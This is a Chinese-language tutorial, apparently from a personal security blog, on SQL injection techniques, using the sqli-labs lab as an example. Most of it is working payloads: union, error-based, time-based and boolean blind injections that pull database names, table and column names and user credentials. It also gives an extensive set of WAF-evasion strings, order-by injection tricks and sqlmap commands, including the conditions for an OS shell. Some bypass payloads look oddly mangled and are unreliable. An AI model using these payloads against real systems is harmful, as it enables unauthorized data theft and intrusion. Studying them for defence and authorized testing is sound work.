---
title: SQL注入
date: 2026-06-09
categories:
  - 核心漏洞
tags: []
---

## 原理：

- 未对用户的输入作严格的验证

- 直接将用户输入的语句带入了sql语句查询

- 错误的处理不恰当，SQL查询出错时的详细的错误信息不应该直接返回给用户

### 判断闭合方式：

输入语句触发报错，在输入的语句后的符号即为闭合方式

### 联合注入(回显正常)

1. 判断有几列（order by）

2. 进行注入（union select）

3. 数据库名-表名-字段名

```Plain Text
?id=1' 判断闭合方式
?id=1' order by 4 --+ 判断行数
?id=-1' union select 1,2,3 --+ 判断回显位
?id=-1' union select 1,database(),version --+ 开始注入出数据库名称和数据库软件版本
?id=-1' union select 1,2，group_concat(table_name) from information_schema.tables where table_schema='xxxx' --+ 开始注入出表名
?id=-1' union select 1,2，group_concat(column_name) from information_schema.columns where table_name='xxx' --+
```

**union select的特性：**
sqlilab的第一关来举例子，order by的结果判断出来是有3列

![image.png](/images/SQL注入/image.png)

id=1的时候并没有达到我们想要通过联合查询来看到回显位的目的，但是我们把id改为id=-1就可以了

![image.png](/images/SQL注入/image%201.png)

这是因为union select的特性，union select会以前面的查询优先，如果id=1是有查询的结果的，那么会优先显示id=1的结果，不会显示后面查询的结果，所以我们要把查询id的这个语句搞来没有查询的结果，所以直接把id改为-1，这个时候肯定是没有结果的，于是我们后面的查询就可以了

### 报错注入(回显报错)

使用几个函数进行注入**updatexml（）**，**extractvalue（）,group by()**

1. updatexml()

updatexml‌函数的基本语法：

updatexml(xml_document, XPath_string, new_value)

其中，xml_document是XML文档对象，XPath_string是Xpath路径表达式，new_value是更新后的内容。在报错注入中，我们通常将第一个和第三个参数设置为任意值，重点是通过第二个参数注入不符合Xpath语法的表达式，从而引起数据库报错，并通过错误信息获取数据。

‌
 2. ‌**extractvalue()**

extractvalue(xml_frag, xpath_expr)
其中，xml_frag是XML片段，xpath_expr是Xpath表达式。在报错注入中，通过提供一个**无效的Xpath表达式**，导致函数报错，从而获取数据。

1. group by()

    函数说明：

    - floor()
向下取整，floor(4.7)=4
若输入字符串，MySQL会尝试转化为数值，失败则返回NULL

    - rand()
生成0~1之间的随机浮点数，如果指定参数（rand(*)）则生成固定伪随机序列
rand(0)的序列为0.0，0.1，0.2...，
所以floor(rand(0)*2)返回的是0，1，1的交替序列

    - conut()
conut(*)包括所有行，count(列明)忽略NULL

    - group by()
按指定列分组，配合聚合函数统计每组数据

    组合发生报错注入


    ```sql
    select count(*),concat((select database()),floor(rand(0)*2))from information_schema.tables group by x;
    //x为concat拼接的数据，from后面的数据可以替换
    //也可以加别名，如下
    select count(*),(concat((select database()),floor(rand(0)*2)))x from information_schema.tables group by x;
    //给了concat((select database()),floor(rand(0)*2)一个别名x，而后直接改数据即可
    ```

### 时间注入（回显抽象）

sleep  ,benchmark 

```sql

?id=1' and if(1=1,sleep(5),1)--+
判断参数构造。
?id=1'and if(length((select database()))>9,sleep(5),1)--+
判断数据库名长度
 
?id=1'and if(ascii(substr((select database()),1,1))=115,sleep(5),1)--+
逐一判断数据库字符
?id=1'and if(length((select group_concat(table_name) from information_schema.tables where table_schema=database()))>13,sleep(5),1)--+
判断所有表名长度
 
?id=1'and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1))>99,sleep(5),1)--+
逐一判断表名
?id=1'and if(length((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'))>20,sleep(5),1)--+
判断所有字段名的长度
 
?id=1'and if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'),1,1))>99,sleep(5),1)--+
逐一判断字段名。
?id=1' and if(length((select group_concat(username,password) from users))>109,sleep(5),1)--+
判断字段内容长度
 
 
 
?id=1' and if(ascii(substr((select group_concat(username,password) from users),1,1))>50,sleep(5),1)--+
逐一检测内容。
```

### 布尔盲注

使用三个函数length(),ascii() ,substr()

|函数名|作用||
|-|-|-|
|`length()`|返回字符串的长度，以字节为单位。对于非字符串类型，会先将其转换为字符串再计算长度。在多字节字符集里，每个字符可能占用多个字节。|- `SELECT LENGTH('abc');` 结果：3 - `SELECT LENGTH('你好');` 若使用 UTF - 8 编码，结果：6 （每个中文字符占 3 个字节） - `SELECT LENGTH(123);` 结果：3|
|`ascii()`|返回字符串最左边字符的 ASCII 码值。若字符串为空，则返回 0。|- `SELECT ASCII('A');` 结果：65 - `SELECT ASCII('Hello');` 结果：72 - `SELECT ASCII('');` 结果：0|
|`substr()`|用于截取字符串的一部分。语法是 `SUBSTR(str, pos, len)`，其中 `str` 是要截取的字符串，`pos` 是起始位置（可为负数，负数表示从字符串末尾开始计数），`len` 是要截取的字符数（可选，若省略则截取从 `pos` 位置到字符串末尾的所有字符）。|- `SELECT SUBSTR('abcdef', 2, 3);` 结果：`bcd` - `SELECT SUBSTR('abcdef', -3);` 结果：`def` - `SELECT SUBSTR('abcdef', 3);` 结果：`cdef`|

顺序：个数，长度，ASCII码

```sql
注入数据库名：
1' and length(database())>n --+ 二分法判断长度
1' and ascii(substr(database(),1,1))>n --+ 判断ascii码
注入数据库中的表名
1' and (select count(table_name) from information_schema.tables where table_schema='爆出的数据库名')>n --+ 先爆出表的个数
1' and length((select table_name from information_schema.tables where table_schema='databse()' limit 0,1))>n --+ 爆第一个表的长度
1' and ascii(substr((select table_name from information_schema.tables where table_schema='database()' limit 0,1),1,1))>n --+ 爆第一个表的各各字符

```

## HTTP头注入：

### 注入条件：

- 能够对请求头消息进行修改

- 修改的请求信息能够带入数据库查询

- 数据库未对输入的请求信息做过滤

1. User-Agent注入
在报文中的User-Agent头后添加闭合，发现报错，即可使用报错注入手段进行注入

2. cookie注入
加闭合发现报错，即可报错注入

3. Referer注入
加闭合报错，直接报错注入

4. X-Forwarded-For注入
加闭合，有报错，直接报错注入

## 宽字节注入：

指特殊符号被正则替换掉了，需要加入%df'，即可把转义绕过，

### 原理：

%df'，转义函数将%df' 转义为 %df\' ，而\就是%5c，最后变成了%df%5c'，而%df%5c在GBK中对应一个汉字，于是\被绕过

## 堆叠注入：

在正常查询语句后直接加 ; 然后接注入语句，不行也就不行了

一般支持的数据库有

- mysql

- SQL server

- ​PostgreSQL

不支持的数据库有orcale，在一行中执行多条语句orcale会报错

## 测试技巧：

### 大致过程：

1. 找到注入点

2. 判断整形或者字符型

3. 判断闭合方式

4. waf绕过

5. 获取少量的数据库信息

6. 交报告

### 小技巧

- 抓包并发给repeter，然后看右下角的一些字节长度与返回时间，看看有没有比较明显的变化，

- 在数据包的请求头中进行操作的时候，空格需要用+或者%20代替，#(注释符)需要用%23代替

- 测试有无sql注入的方法：

```Plain Text
布尔法：
1' and 1=1 --+
1' && '1'='2 --+

报错法：exp的值超过709就会报错
1' and exp(710) --+ 

延时法：benchmark是mysql专用,200000000是增加一秒
1' sleep(5) --+
1' benchmark(200000000,1=1) --+
```

### sql注入中的like方法：

like用与在sql中进行模糊查询，可以帮助查找符合特定模式的数据，而不需要完全匹配。通过使用%，_ 两个通配符，可以实现广泛的搜索需求

```sql
--查找以特定的字符串开头的行
select * from users where username like 'jo%';
--将返回所有username以jo开头的行

--查找以特定的字符串结尾的行
select * from users where email like '%gmail.com';
--将返回所有eamil以gmail.com结尾的行

--找包含特定的字符串的行：
select * from users where username like '%smith%';
--返回username中所有包含smith字符串的行

--精确匹配一个一个字符和后续的字符
select * from users where username like 'j_smith';
--这将匹配username中是以j开头，然后是一个字符。然后是smith的行。_只匹配一个字符
```

### SQL注入中的exp方法

exp是一个数学函数，exp中的值超过709就会报错，exp函数可以随便使用什么连接符号来来连接，比如and，'，&，&&都可以

#### exp与like一起使用

```sql
--判断有无注入
?id=1 and exp(710) --+
--如果报错了证明就是又注入了

--假设数据库名称是security，现在开始注入
?id=1 and exp(710-(database() like 's%'))
--如果后面的(databsae() like 's%')为真，那么就不会报错，如果为假，则会报错，就这样直接去一个一个的匹配，然后就可以了



```

database()可以换成任意的函数，

#### exp与其他的函数一起使用：

```sql
--与ascii()一起使用
select * from users where id = 1 and exp(710-ascii(CURRENT_USER));
--这个就是直接减去current_user的ascii值，然后就是直接把710往上加，然后就可以测试了
```

## 绕过waf的技巧：

### 内联注释，注释：

在mysql中/*!*/中的内容不是注释，在其他的数据库中就是注释

 在注释中加不加上版本号都可以，但是加上随机的版本号绕过的概率更高，版本号不能低于数据库的版本号

```sql
/*!40444database()*/
select database();
--这两个语句在mysql中是同样的
```

#### 空格的代替：

```sql
%20 %09 %0a %0b %0c %0d %00 /**/ /*!*/
--%0a 
--ABC%0a
%23%0a
%23%0A
```

#### 等号的代替：

regexp是mysql中的正则匹配运算符，相当于=了

<>是mysql中的不相等运算符，如果不相等就是为真

```sql
?id=1' and '1'regexp'1 
?id=1''1'regexp'1
?id=1'and '1'<>'2   --这个值不相等的时候，结果为真
```

#### 函数的代替：

使用内联注释直接代替一部分内容，或者用注释来插入关键词当中

```sql
database()
database(/*!44444*/)
database/**/()
database/**/(/*!*/)
database%23qwe%0a(%0a)
--如此类推直接随机组合就可以了，只需要看一看什么呗过滤了就直接看看其他的就可以了
```

#### 括号的差分：

使用内联注释直接把括号隔开

只需要记住这个内联注释相当与一种包裹就就可以了

```sql
select database/*!44444(*/)

```

### 逻辑判断绕过（and 1=1 类）

利用字符混淆、运算符变形维持等效逻辑，让 WAF 误判：

```sql
?id=1'//44444and'//1444442'=2--+ 
?id=1"//4444and"//12"=2--+
?id=3"//44444and"1=1--+
?id=3'//44444or"/**/1=1--+
?id=3' || 1=1--+
?id=1' like'1=1
```

### order by 绕过
因 order by 易被拦截，替换为 group by 或拆分关键字：

```sql
?id=1' group by 1--+
?id=1"//44444group"//144443by"//1--+
?id=1"//order"//by"//1--+ （用注释拆分）
?id=1"//order"//by"//1--+ （重复拆分写法）
?id=1"//order%0a"//a"//by"/**/1%23 （换行符 %0a 混淆 ）
```

### union select 绕过

通过注释、编码、特殊字符拼接拆分关键字，或伪装语句：

```sql
?id=1'union//1'1'//144444select*/1,2,3--+
?id=%22union"//1'%1%"//144444select*/1,2,3%23 （URL 编码 + 注释 ）
?id=%222%22union"//1'%11%11%"//144444select*/1,2,3%23
?id=%222%22union"//1'%11'1%11%"//144444select*/1,2,3%23
?id=1 like"%23%"//110444union%0Aselect*/1,2,3--+ （%0A 换行符 + 模糊匹配 ）
?id=-1 like"%23%"//110444union%0Aselect*/1,2,3--+
```

### if 函数与时间盲注绕过
混淆字符、编码隐藏敏感函数：

```sql
?id=1' and/**/sdas'"sdad'if((1=1,sleep(/**/5)),2)%23
?id=1' and/**/sdas'"sdad'if((1=1,sleep(/**/3)),'""',2)%23
?id=1' and//111'asd'"if(length(database//111111'())>2,sleep(//5),2)%23
?id=1' and//'☺asd'"if(length(database//111111'())>2,sleep(//5),2)%23 （表情符号混淆 ）
?id=1' and//'☺if((length(database//--☺%0A"*"())>8,sleep(//5),2)%23 （换行符 + 符号干扰 ）
```

### **报错注入绕过（针对 updatexml 拦截 ）**

**拆分函数名或用等效函数（如 extractvalue ）绕过：
探测数据库版本**

```sql
?id=1' and-updatexml//111111'/(1,concat(0x7e,version%23qwe%0A//144444'),0x7e)--+
?id=1' and extractvalue//111111'/(1,concat//111111'/(0x7e,(version//111111'()),0x7e))--+
探测数据库名
?id=1' and-updatexml//111111'/(1,concat(0x7e,database%23qwe%0A//144444'),0x7e)--+
?id=1' and extractvalue//111111'/(1,concat//111111'/(0x7e,(database/**/111111'()),0x7e))--+
```

### 关键字替换通用技巧
通过等效替换绕 WAF 特征匹配：

```Plain Text
user() → current_user
sleep() → BENCHMARK() （用计算耗时模拟延迟 ）
order by → group by
and updatexml → and - updatexml （连字符拆分 ）
concat() → concat_ws()
and → &&
or → ||
concat → constring （部分环境自定义替换 ）
```

### 预编译下的绕过

一些地方使用了预编译语句，所以一般的sql语句就没什么作用了，就只有伊西俄而已使用了，

- order by

- like

- in

这些语句是不能预编译的，不然会失去作用

#### order by

排序的功能点是比较特殊，常规的测试字符型或者数字型都不行的话，就要看看是不是排序了，如果是排序的话

```sql
?id=1 and 1=1 --没有反应
?id=1 and 1=2 --没有反应
?id=1'' --任何的字符都没用
?id=1,2,3 --正常的话应该报错，但是排序是不会报错的
?id=rand() --普通的是没有数据的，但是排序是有的
```

如果判断就是排序的话，就直接

```sql
?id=if(1=1,username,password) --若第一个条件为真，返回第二个，为假，返回第三个
?id=if(database()like'%s',sleep(3),password)

--支持报错注入
?id=updataxml()
```

## sqlmap使用：

对于get型的sql注入就直接-u就可以了

对于post型的sql注入，需要手动住去数据包，然后保存在sqlmap的文件夹中，然后直接-r xxx.txt就可以了，但是如果里面的参数过多，就可以指定参数，-p 参数名称

```Plain Text
python sqlmap.py -u http://xxx.xxx.xxx
python sqlmap.py -r xxx.txt -p username
```

### sqlmap的--os--shell

需要有三个条件：

- root权限

- secure_file_priv='' --这个功能是关闭的

- 知道www的路径

